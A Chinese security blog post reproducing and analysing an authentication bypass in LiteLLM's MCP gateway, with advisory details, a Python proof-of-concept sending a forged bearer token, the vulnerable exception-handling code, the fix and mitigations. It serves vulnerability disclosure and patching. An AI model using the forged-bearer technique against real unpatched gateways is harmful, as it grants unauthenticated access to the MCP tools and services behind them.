#  LiteLLM MCP OAuth2 passthrough 认证绕过复现与分析  
原创 whoami0002
                        whoami0002  SecurityPaper   2026-11-27 16:00  
  
LiteLLM 是用得很广的 LLM 网关/代理，它的 MCP 网关能把一堆后端 MCP 工具聚合起来、统一鉴权后再暴露给客户端。今年 6 月它披露了一个 MCP 认证绕过：一个**未认证**  
的攻击者，只要在请求里带一个**随便编的**Authorization: Bearer xxx  
，就能建立一个"已认证"的 MCP 会话，去列举和调用网关后面配置的 MCP 工具。  
  
根因很干净——为了支持"把 OAuth2 token 透传给上游 MCP 服务器"，鉴权处理在 LiteLLM key 校验失败时，没有拒绝，反而兜底返回了一个**空的、但有效的**UserAPIKeyAuth()  
。  
## 一、漏洞说明  
  
Advisory：  
https://github.com/BerriAI/litellm/security/advisories/GHSA-7488-6r32-c95q[1]  
  
LiteLLM 的 MCP Streamable HTTP 端点在处理鉴权时，支持"OAuth2 透传"：当请求带 Authorization  
 头、但不是合法 LiteLLM key 时，本意是把它当作要转发给上游 OAuth2 MCP 服务器的 token。问题在于它的兜底逻辑——LiteLLM key 校验抛出 401/403 后，except  
 把异常吞掉，转而把鉴权结果设成一个空的 UserAPIKeyAuth()  
。这个空对象在下游被当作一个合法的、已认证的会话。于是任何人带一个伪造的 Bearer 就能通过鉴权，拿到对 MCP 工具的访问权，进而触达网关后面连接的各类服务。  
## 二、基本信息  
<table><thead><tr style="box-sizing: border-box;margin: 0px;padding: 0px;"><td style="box-sizing: border-box;margin: 0px;padding: 4px 8px;text-align: left;color: rgb(63, 63, 63);line-height: 1.5;font-size: 12.8px;font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &#34;PingFang SC&#34;, Cambria, Cochin, Georgia, Times, &#34;Times New Roman&#34;, serif;border: 1px solid rgb(223, 223, 223);"><section><span leaf="">公开时间</span></section></td><td style="box-sizing: border-box;margin: 0px;padding: 4px 8px;text-align: left;color: rgb(63, 63, 63);line-height: 1.5;font-size: 12.8px;font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &#34;PingFang SC&#34;, Cambria, Cochin, Georgia, Times, &#34;Times New Roman&#34;, serif;border: 1px solid rgb(223, 223, 223);"><section><span leaf="">2026-06-30</span></section></td></tr></thead><tbody><tr style="box-sizing: border-box;margin: 0px;padding: 0px;"><td style="box-sizing: border-box;margin: 0px;padding: 4px 8px;text-align: left;color: rgb(63, 63, 63);line-height: 1.5;font-size: 12.8px;font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &#34;PingFang SC&#34;, Cambria, Cochin, Georgia, Times, &#34;Times New Roman&#34;, serif;border: 1px solid rgb(223, 223, 223);"><section><span leaf="">编号</span></section></td><td style="box-sizing: border-box;margin: 0px;padding: 4px 8px;text-align: left;color: rgb(63, 63, 63);line-height: 1.5;font-size: 12.8px;font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &#34;PingFang SC&#34;, Cambria, Cochin, Georgia, Times, &#34;Times New Roman&#34;, serif;border: 1px solid rgb(223, 223, 223);"><section><span leaf="">GHSA-7488-6r32-c95q</span></section></td></tr><tr style="box-sizing: border-box;margin: 0px;padding: 0px;"><td style="box-sizing: border-box;margin: 0px;padding: 4px 8px;text-align: left;color: rgb(63, 63, 63);line-height: 1.5;font-size: 12.8px;font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &#34;PingFang SC&#34;, Cambria, Cochin, Georgia, Times, &#34;Times New Roman&#34;, serif;border: 1px solid rgb(223, 223, 223);"><section><span leaf="">威胁类型</span></section></td><td style="box-sizing: border-box;margin: 0px;padding: 4px 8px;text-align: left;color: rgb(63, 63, 63);line-height: 1.5;font-size: 12.8px;font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &#34;PingFang SC&#34;, Cambria, Cochin, Georgia, Times, &#34;Times New Roman&#34;, serif;border: 1px solid rgb(223, 223, 223);"><section><span leaf="">认证绕过（OAuth2 passthrough fallback）</span></section></td></tr><tr style="box-sizing: border-box;margin: 0px;padding: 0px;"><td style="box-sizing: border-box;margin: 0px;padding: 4px 8px;text-align: left;color: rgb(63, 63, 63);line-height: 1.5;font-size: 12.8px;font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &#34;PingFang SC&#34;, Cambria, Cochin, Georgia, Times, &#34;Times New Roman&#34;, serif;border: 1px solid rgb(223, 223, 223);"><section><span leaf="">CVSS 3.1</span></section></td><td style="box-sizing: border-box;margin: 0px;padding: 4px 8px;text-align: left;color: rgb(63, 63, 63);line-height: 1.5;font-size: 12.8px;font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &#34;PingFang SC&#34;, Cambria, Cochin, Georgia, Times, &#34;Times New Roman&#34;, serif;border: 1px solid rgb(223, 223, 223);"><section><span leaf="">8.8（High）</span></section></td></tr><tr style="box-sizing: border-box;margin: 0px;padding: 0px;"><td style="box-sizing: border-box;margin: 0px;padding: 4px 8px;text-align: left;color: rgb(63, 63, 63);line-height: 1.5;font-size: 12.8px;font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &#34;PingFang SC&#34;, Cambria, Cochin, Georgia, Times, &#34;Times New Roman&#34;, serif;border: 1px solid rgb(223, 223, 223);"><section><span leaf="">利用条件</span></section></td><td style="box-sizing: border-box;margin: 0px;padding: 4px 8px;text-align: left;color: rgb(63, 63, 63);line-height: 1.5;font-size: 12.8px;font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &#34;PingFang SC&#34;, Cambria, Cochin, Georgia, Times, &#34;Times New Roman&#34;, serif;border: 1px solid rgb(223, 223, 223);"><section><span leaf="">无需有效凭据，带任意 </span><code style="box-sizing: border-box;margin: 0px;padding: 3px 5px;text-align: left;color: rgb(255, 53, 2);line-height: 1.5;font-size: 11.52px;font-family: &#34;Operator Mono&#34;, Consolas, Monaco, Menlo, monospace;background: rgb(248, 245, 236);border-radius: 2px;"><span leaf="">Authorization: Bearer</span></code><span leaf=""> 头即可</span></section></td></tr><tr style="box-sizing: border-box;margin: 0px;padding: 0px;"><td style="box-sizing: border-box;margin: 0px;padding: 4px 8px;text-align: left;color: rgb(63, 63, 63);line-height: 1.5;font-size: 12.8px;font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &#34;PingFang SC&#34;, Cambria, Cochin, Georgia, Times, &#34;Times New Roman&#34;, serif;border: 1px solid rgb(223, 223, 223);"><section><span leaf="">修复 commit</span></section></td><td style="box-sizing: border-box;margin: 0px;padding: 4px 8px;text-align: left;color: rgb(63, 63, 63);line-height: 1.5;font-size: 12.8px;font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &#34;PingFang SC&#34;, Cambria, Cochin, Georgia, Times, &#34;Times New Roman&#34;, serif;border: 1px solid rgb(223, 223, 223);"><code style="box-sizing: border-box;margin: 0px;padding: 3px 5px;text-align: left;color: rgb(255, 53, 2);line-height: 1.5;font-size: 11.52px;font-family: &#34;Operator Mono&#34;, Consolas, Monaco, Menlo, monospace;background: rgb(248, 245, 236);border-radius: 2px;"><span leaf="">73869f0</span></code><section><span leaf="">（</span><span style="box-sizing: border-box;margin: 0px;padding: 0px;text-align: left;color: rgb(13, 117, 252);line-height: 1.5;font-size: 16px;font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &#34;PingFang SC&#34;, Cambria, Cochin, Georgia, Times, &#34;Times New Roman&#34;, serif;"><span leaf=""><a class="wx_topic_link" topic-id="mwz5dzgf-vkj6gf" style="color: #576B95 !important;" data-topic="1" data-recommend="">#26463</a></span><sup style="box-sizing: border-box;margin: 0px;padding: 0px;"><span leaf="">[2]</span></sup></span><span leaf="">）</span></section></td></tr></tbody></table>## 三、受影响版本  
  
litellm < 1.84.0  
，修复于 1.84.0  
。  
## 四、影响组件  
  
LiteLLM 是一个把各家大模型 API 统一成 OpenAI 协议的网关/代理，广泛部署在 LLM 应用后端。它的 MCP 网关（/mcp/  
 系列端点）把多个后端 MCP 服务器聚合起来，由 LiteLLM 统一做鉴权与访问控制，再暴露给 MCP 客户端（通常是大模型 / Agent）。这类"统一鉴权入口"一旦被绕过，影响的是它身后所有被聚合的工具与服务。  
## 五、利用条件  
  
1.  
部署启用了 LiteLLM 的 MCP 网关端点（/mcp/  
）；  
2.  
版本 < 1.84.0  
；  
3.  
攻击者能访问到 MCP 端点；  
4.  
请求带一个 Authorization  
 头、但**不带**x-litellm-api-key  
——token 内容随便填。  
## 六、环境搭建  
  
两个隔离 venv 装漏洞版与修复版（都带 proxy 依赖）：  
```
python3 -m venv .venv-vuln
. .venv-vuln/bin/activate && pip install "litellm[proxy]==1.83.6" && deactivate

python3 -m venv .venv-fixed
. .venv-fixed/bin/activate && pip install "litellm[proxy]==1.84.0" && deactivate
```  
  
复现直接调用**真实**  
的鉴权方法 MCPRequestHandler.process_mcp_request()  
。唯一打桩的是它依赖的 user_api_key_auth  
——把它换成"对无效 key 抛 HTTP 401"，这正是该函数对伪造 LiteLLM key 的真实行为， 这样就不必为复现去搭一整套带数据库的 proxy，而漏洞所在的方法本身是原样的代码：  
```
import asyncio, litellm
from litellm.proxy._experimental.mcp_server.auth import user_api_key_auth_mcp as m
from litellm.proxy._types import UserAPIKeyAuth
from fastapi import HTTPException

async def reject_invalid_key(*a, **k):      # 真实 user_api_key_auth 对伪造 key 的行为
    raise HTTPException(status_code=401, detail="Invalid proxy server token passed")
m.user_api_key_auth = reject_invalid_key

def scope(bearer):                           # 最小 ASGI 请求：只带攻击者可控的 Authorization 头
    return {"type": "http", "method": "POST", "path": "/mcp/", "query_string": b"",
            "headers": [(b"authorization", bearer.encode())]}

async def main():
    result = await m.MCPRequestHandler.process_mcp_request(scope("Bearer totally-fake-attacker-token"))
    auth: UserAPIKeyAuth = result[0]
    print("返回:", type(auth).__name__, "| api_key =", repr(auth.api_key), "| user_role =", auth.user_role)

asyncio.run(main())
```  
## 七、漏洞复现  
### 1、漏洞版 1.83.6  
  
![img](https://mmbiz.qpic.cn/sz_mmbiz_png/eMTyD09PvaYaLGvfpg6ZwwDFKicugQon0TJvyztGY9gBG59P1Lliaiau7ZibofV2odgbRkt0hlSfpZfchXGg7tTFnlD4CqKJrCwQ4tpzRrdbeec/640?wx_fmt=png&from=appmsg "null")  
  
伪造的 Bearer 没有被拒绝，process_mcp_request  
 返回了一个 UserAPIKeyAuth  
——一个合法的、已认证的会话上下文（api_key=None  
 只是说明它是匿名兜底出来的，但在下游一样被当作"已通过鉴权"）。  
  
![img](https://mmbiz.qpic.cn/sz_mmbiz_png/eMTyD09PvaYhnc6zicOtN3PEboPBNKmKNPLkibS2PpUW48h8EUHiblyhm3QPzVicvkFOnKrayIWv3HkA35kTysq049yTU9vHIiaGZ9nm4yUiaEFpI/640?wx_fmt=png&from=appmsg "null")  
### 2、修复版 1.84.0  
  
![img](https://mmbiz.qpic.cn/sz_mmbiz_png/eMTyD09PvaZDIbcZicaR03UoDCE7efxn1WsUic2Lt91QtU1WZNBCMsgbbr0ia3Jk7yunsQITPicYm6jPayic2TehyoAaPt9971AsRx2TkAATfiaHs/640?wx_fmt=png&from=appmsg "null")  
  
同一攻击在修复版里被 401 拒绝。  
## 八、漏洞分析  
### 1、鉴权分发逻辑  
  
litellm/proxy/_experimental/mcp_server/auth/user_api_key_auth_mcp.py  
 的 process_mcp_request()  
，按请求头选择怎么鉴权（1.83.6）：  
  
![img](https://mmbiz.qpic.cn/sz_mmbiz_png/eMTyD09PvaYv6mJSQ5jYCwQGicBRPC6Uy9nau4fRGMnnQIvpHPb1FJDdOECYibeY1AVbu9x3VwyBtRU145h0unUQ3BMDZXE9gg3udWz9kZ0UE/640?wx_fmt=png&from=appmsg "null")  
```
120        if ".well-known" in str(request.url):   # public routes
121            validated_user_api_key_auth = UserAPIKeyAuth()
122        elif has_explicit_litellm_key:
123            # 显式 x-litellm-api-key：正常校验
124            validated_user_api_key_auth = await user_api_key_auth(
125                api_key=litellm_api_key, request=request)
127        elif oauth2_headers:
128            # 没有 x-litellm-api-key，但有 Authorization 头：
129            # 可能是 LiteLLM key（向后兼容），也可能是要透传给上游 MCP 的 OAuth2 token
132            try:
133                validated_user_api_key_auth = await user_api_key_auth(
134                    api_key=litellm_api_key, request=request)
136            except HTTPException as e:
137                if e.status_code in (401, 403):
142                    validated_user_api_key_auth = UserAPIKeyAuth()   # ← 认证失败却给了有效会话
143                else:
144                    raise
145            except ProxyException as e:
146                if str(e.code) in ("401", "403"):
151                    validated_user_api_key_auth = UserAPIKeyAuth()   # ← 同上
152                else:
153                    raise
154        else:
155            validated_user_api_key_auth = await user_api_key_auth(
156                api_key=litellm_api_key, request=request)
```  
### 2、绕过点  
  
攻击者带 Authorization: Bearer <任意>  
、不带 x-litellm-api-key  
，于是：  
```
has_explicit_litellm_key = False     （没有 x-litellm-api-key）
oauth2_headers = {"Authorization": "..."}   （有 Authorization 头 -> 进入 elif oauth2_headers 分支）
  -> user_api_key_auth(伪造 key)  抛 HTTPException(401)
  -> except 捕获，status 是 401
  -> validated_user_api_key_auth = UserAPIKeyAuth()   （第 142 行）
  -> 返回这个空会话，鉴权"通过"
```  
  
对比第 154 行的 else  
 分支（没有任何鉴权头时）：它同样调 user_api_key_auth  
，但**不**  
捕获异常——校验失败就如实抛出、拒绝请求。也就是说，**带一个伪造 Bearer 反而比什么都不带更容易过**  
：异常被 except  
 吞成了匿名会话。  
### 3、根因  
  
一句话：**OAuth2 透传的兜底逻辑把"LiteLLM key 校验失败（401/403）"无条件翻译成了"匿名但有效的会话"（**UserAPIKeyAuth()**），而没有先确认这次请求确实指向一个配置了 OAuth2 透传的上游服务器。**  
 认证失败的正确处理是拒绝，这里却成了放行。  
### 4、调用链  
```
攻击者请求  Authorization: Bearer <garbage>  (无 x-litellm-api-key)
  -> MCPRequestHandler.process_mcp_request(scope)
     -> elif oauth2_headers:
        -> user_api_key_auth(伪造 key)  -> raise HTTPException(401)
        -> except HTTPException: status==401
           -> validated_user_api_key_auth = UserAPIKeyAuth()   # 认证绕过
  -> 返回有效会话 -> 可列举/调用 MCP 工具
```  
### 5、修复  
  
1.84.0 把兜底收紧：只有当请求**确实指向一个 operator 配置了**auth_type=oauth2**的上游服务器**  
时，401/403 才回退匿名透传；其它情况下校验失败照常抛出。对应提交是 73869f0  
（  
[#26463]()  
[3]  
，**tighten public-route detection and OAuth2 fallback gating**  
），v1.84.0  
 包含它。源码里的注释把动机写得很直白——否则攻击者就能"拿任意垃圾 bearer 换一个匿名会话"：  
  
![img](https://mmbiz.qpic.cn/sz_mmbiz_png/eMTyD09PvaZxJAlpXvvoXhF1pnZPfkrZZZhwTB8FVI0v5p6jgFM3gJP4bIINaJjibv33shnB8ay2LQfW0kCjPExB8oIPQPW6Pr2byKKPsdts/640?wx_fmt=png&from=appmsg "null")  
```
except (HTTPException, ProxyException) as e:
    status = e.status_code if isinstance(e, HTTPException) else e.code
    if status in (401, 403, "401", "403") and \
            MCPRequestHandler._target_servers_use_oauth2(
                path=request.url.path, mcp_servers=mcp_servers):
        ...  # 仅此时才回退匿名透传
    else:
        raise          # 否则认证失败照常拒绝
```  
  
顺带一提，同一版本还把开头那行公共路由判断从 ".well-known" in str(request.url)  
（子串匹配，能被 query/host 走私）改成了 request.url.path.startswith("/.well-known/")  
（只看 path、前缀精确匹配）——也是一处"看似无害的宽松判断"。  
### 6、拓展  
  
这类"认证失败兜底成匿名会话"的反模式，根子在于把两件事混在了一个 except  
 里：一是"这个 token 不是我的 key"（正常，可能要走透传），二是"这次请求该不该被放行"。正确的做法是先确定请求的目标与策略，再决定校验失败意味着什么——而不是一律降级放行。审计鉴权中间件时，凡是 except ... : <设为已认证/空凭据对象>  
 的写法都要警惕：认证的失败分支默认应该是拒绝。  
## 九、修复措施  
### 1、安全更新  
  
升级到 litellm >= 1.84.0  
：  
```
pip install -U "litellm[proxy]>=1.84.0"
```  
### 2、临时缓解  
  
1.  
若暂时无法升级，在反向代理 / API 网关层拦掉 /mcp/  
 及相关 MCP 端点的外部访问；  
2.  
只对确有 OAuth2 透传需求的上游服务器开启该能力，其余 MCP 服务器用显式 key/bearer 鉴权；  
3.  
给 MCP 端点加独立的网络访问控制，别让未认证流量直达。  
## 参考  
  
•  
GitHub Advisory（GHSA-7488-6r32-c95q）：  
https://github.com/BerriAI/litellm/security/advisories/GHSA-7488-6r32-c95q[4]  
•  
修复 commit：  
https://github.com/BerriAI/litellm/commit/73869f0faf7d11ee21adcb5f91b8c33a340b6c2c[5]  
•  
修复 PR [#26463]()  
：  
https://github.com/BerriAI/litellm/pull/26463[6]  
•  
项目仓库：  
https://github.com/BerriAI/litellm[7]  
•  
修复版本 v1.84.0：  
https://github.com/BerriAI/litellm/releases/tag/v1.84.0[8]  
•  
MCP 协议：  
https://modelcontextprotocol.io/[9]  
### References  
  
[1]  
: https://github.com/BerriAI/litellm/security/advisories/GHSA-7488-6r32-c95q[2]  
 [#26463]()  
: https://github.com/BerriAI/litellm/pull/26463[3]  
 [#26463]()  
: https://github.com/BerriAI/litellm/pull/26463[4]  
: https://github.com/BerriAI/litellm/security/advisories/GHSA-7488-6r32-c95q[5]  
: https://github.com/BerriAI/litellm/commit/73869f0faf7d11ee21adcb5f91b8c33a340b6c2c[6]  
: https://github.com/BerriAI/litellm/pull/26463[7]  
: https://github.com/BerriAI/litellm[8]  
: https://github.com/BerriAI/litellm/releases/tag/v1.84.0[9]  
: https://modelcontextprotocol.io/  
  
  
